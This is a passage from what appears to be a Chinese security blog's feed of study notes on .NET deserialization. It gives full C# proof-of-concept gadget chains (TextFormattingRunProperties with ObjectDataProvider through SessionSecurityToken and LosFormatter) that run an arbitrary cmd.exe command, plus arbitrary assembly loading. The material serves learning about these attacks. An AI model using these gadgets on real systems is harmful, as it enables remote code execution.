&#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是上面讲的那个<strong>ClaimsIdentity</strong>的子类   我们跟进这个类的反序列化函数中</p><p><img src="../images/image-20240305170131681.png" alt="image-20240305170131681"></p><p>其反序列化构造函数还继承了这个父类的反序列化构造函数</p><p><img src="../images/image-20240305170246677.png" alt="image-20240305170246677"></p><p>我们跟进这Deserialize方法中  </p><p><img src="../images/image-20240305170431050.png" alt="image-20240305170431050"></p><p>发现这里有很多case  都会先base64解码  然后放入到binary中进行反序列化操作</p><p><img src="../images/image-20240305170514665.png" alt="image-20240305170514665"></p><p>其参数就是ClaimsIdentity类中的参数  那么我们在序列化的时候给其赋值就行了</p><p>那么在info中设置key为System.Security.ClaimsIdentity.actor或bootstrapContext或claims，值为base64之后的TextFormattingRunPropertiesMarshal对象即可触发RCE。</p><h2 id="SessionSecurityToken"><a href="#SessionSecurityToken" class="headerlink" title="SessionSecurityToken"></a>SessionSecurityToken</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IdentityModel.Tokens;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            BinaryFormatter bf = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal();</span><br><span class="line">                bf.Serialize(memory, textFormattingRunPropertiesMarshal);</span><br><span class="line">                <span class="built_in">string</span> b64payload = Convert.ToBase64String(memory.ToArray());</span><br><span class="line">                SessionSecurityTokenMarshal windowsIdentityIdentityMarshal = <span class="keyword">new</span> SessionSecurityTokenMarshal(b64payload);</span><br><span class="line"></span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Serialize(memory, windowsIdentityIdentityMarshal);</span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Deserialize(memory);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SessionSecurityTokenMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SessionSecurityTokenMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(SessionSecurityToken));</span><br><span class="line">            MemoryStream stream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (XmlDictionaryWriter xmlDictionaryWriter = XmlDictionaryWriter.CreateBinaryWriter(stream, <span class="literal">null</span>, <span class="literal">null</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;SecurityContextToken&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Version&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteValue(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteElementString(<span class="string">&quot;SecureConversationVersion&quot;</span>, <span class="string">&quot;&quot;</span>, (<span class="keyword">new</span> Uri(<span class="string">&quot;http://schemas.xmlsoap.org/ws/2005/02/sc&quot;</span>)).AbsoluteUri);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteElementString(<span class="string">&quot;Id&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">                WriteElementStringAsUniqueId(xmlDictionaryWriter, <span class="string">&quot;ContextId&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Key&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteBase64(<span class="keyword">new</span> <span class="built_in">byte</span>[] &#123; <span class="number">0x01</span> &#125;, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line"></span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;EffectiveTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;ExpiryTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;KeyEffectiveTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;KeyExpiryTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;ClaimsPrincipal&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Identities&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Identity&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;BootStrapToken&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteValue(B64Payload); <span class="comment">// This is where the payload is</span></span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line">                xmlDictionaryWriter.Flush();</span><br><span class="line"></span><br><span class="line">                stream.Position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Console.WriteLine(Encoding.ASCII.GetString(stream.ToArray()));</span></span><br><span class="line"></span><br><span class="line">                info.AddValue(<span class="string">&quot;SessionToken&quot;</span>, stream.ToArray());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">WriteElementContentAsInt64</span>(<span class="params">XmlDictionaryWriter writer, String localName, String ns, <span class="built_in">long</span> <span class="keyword">value</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            writer.WriteStartElement(localName, ns);</span><br><span class="line">            writer.WriteValue(<span class="keyword">value</span>);</span><br><span class="line">            writer.WriteEndElement();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">WriteElementStringAsUniqueId</span>(<span class="params">XmlDictionaryWriter writer, String localName, String ns, <span class="built_in">string</span> id</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            writer.WriteStartElement(localName, ns);</span><br><span class="line">            writer.WriteValue(id);</span><br><span class="line">            writer.WriteEndElement();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p><img src="../images/image-20240306144310027.png" alt="image-20240306144310027"></p><p><img src="../images/image-20240306144327778.png" alt="image-20240306144327778"></p><p>在SessionSecurityToken类的构造反序列化函数中有个ReadPrincipal函数   我们跟进</p><p><img src="../images/image-20240306144407446.png" alt="image-20240306144407446"></p><p>发现其调用了这个函数ReadIdentities  我们再次跟进</p><p><img src="../images/image-20240306144439645.png" alt="image-20240306144439645"></p><p>再次跟进又发现了其ReadIdentity函数  我们再次跟进</p><p><img src="../images/image-20240306144526674.png" alt="image-20240306144526674"></p><p>该方法中将BootstrapToken标签中的内容base64解码通过binaryformatter反序列化  思路清晰了  那么我们就只需要在其序列化的时候  调用GetObjectData函数  来给这些参数赋值  使其能成功调用到这些函数  并走到最后反序列化处</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LosFormatter&quot;&gt;&lt;a href=&quot;#LosFormatter&quot; class=&quot;headerlink&quot; title=&quot;LosFormatter&quot;&gt;&lt;/a&gt;LosFormatter&lt;/h2&gt;&lt;p&gt;LosFormatter一般用于序列化存储视图流状态，多用于</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-05</title>
    <link href="https://ke1nys.github.io/posts/a396de2e.html"/>
    <id>https://ke1nys.github.io/posts/a396de2e.html</id>
    <published>2024-02-29T07:01:43.000Z</published>
    <updated>2024-03-12T14:41:01.016Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md</a></p><p><a href="https://boogipop.com/2024/02/28/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/#0-1-ASP-NET-%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD">https://boogipop.com/2024/02/28/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/#0-1-ASP-NET-%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD</a></p><h2 id="Net任意类加载"><a href="#Net任意类加载" class="headerlink" title=".Net任意类加载"></a>.Net任意类加载</h2><p>在学习这个<code>SoapFormatter</code>类之前  我们先学习一下这个任意类加载   其实和java是一样的   java中编译的class对应这里的dll</p><p><strong>calc.cs</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ExpClassLibrary</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ExpClass</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ExpClass</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            MessageBox.Show(<span class="string">&quot;ExpClass DLL loaded successfully!&quot;</span>, <span class="string">&quot;DLL Loaded&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Information);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译dll命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc.exe /target:library /out:calc.dll calc.cs</span><br></pre></td></tr></table></figure><p>csharp里类编译后会变成dll文件，那么我们同样的也可以读取dll文件的字节流，通过Assembly.Load方法去加载，获取到的是一个assembly对象，通过gettypes获取dll内所有的类型，这里当然只有一个类型，然后通过<code>Activator.CreateInstance</code>实例化对象触发恶意方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            var assembly = Assembly.Load(File.ReadAllBytes(&quot;C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\ExpClass.dll&quot;));</span><br><span class="line">            // var calculatorType = assembly.GetType(&quot;CalcLibrary.Calculator&quot;);</span><br><span class="line">            // var calculator = Activator.CreateInstance(calculatorType);</span><br><span class="line">            // var method = calculatorType.GetMethod(&quot;ShowPopup&quot;);</span><br><span class="line">            // method.Invoke(calculator, null);</span><br><span class="line">            var types = assembly.GetTypes();</span><br><span class="line">            Activator.CreateInstance(types[0]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304164049449.png" alt="image-20240304164049449"></p><h2 id="SoapFormatter"><a href="#SoapFormatter" class="headerlink" title="SoapFormatter"></a>SoapFormatter</h2><p>SoapFormatter类似XmlSerializer，用于生成基于xml的soap数据流，命名空间位于System.Runtime.Serialization.Formatters.Soap。</p><p><strong>demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span> =&gt; age; <span class="keyword">set</span> =&gt; age = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span> =&gt; name; <span class="keyword">set</span> =&gt; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;hello from SayHello&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SoapFormatter soapFormatter = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Age = <span class="number">10</span>;</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream stream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                soapFormatter.Serialize(stream,person);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">string</span> soap = Encoding.UTF8.GetString(stream.ToArray());</span><br><span class="line">                Console.WriteLine(soap);</span><br><span class="line"></span><br><span class="line">                stream.Position = <span class="number">0</span>;</span><br><span class="line">                Person p = (Person)soapFormatter.Deserialize(stream);</span><br><span class="line">                Console.WriteLine(p.Name);</span><br><span class="line">                p.SayHello();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;SOAP-ENV:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmls</span><br><span class="line">oap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:clr=&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot; SOAP-EN</span><br><span class="line">V:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;a1:Person id=&quot;ref-1&quot; xmlns:a1=&quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/ConsoleApplication2%2C%20Version%3D1.0.0.0%2C%20Culture%3Dne</span><br><span class="line">utral%2C%20PublicKeyToken%3Dnull&quot;&gt;</span><br><span class="line">&lt;age&gt;10&lt;/age&gt;</span><br><span class="line">&lt;name id=&quot;ref-3&quot;&gt;jack&lt;/name&gt;</span><br><span class="line">&lt;/a1:Person&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br><span class="line"></span><br><span class="line">jack</span><br><span class="line">hello from SayHello</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实看起来和xaml差不多</p><p><img src="../images/image-20240229154027957.png" alt="image-20240229154027957"></p><p>和其他序列化类一样  都是继承这两个接口  并且有代理器选择等等</p><h2 id="ActivitySurrogateSelector"><a href="#ActivitySurrogateSelector" class="headerlink" title="ActivitySurrogateSelector"></a>ActivitySurrogateSelector</h2><p>这个类一看名字就知道是个代理器  代理器是啥和使用方法在外面的序列化01就讲过了  这里就不多赘述了</p><p>简单来讲其就是可以让一个本不可以序列化的类进行序列化</p><p><strong>demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 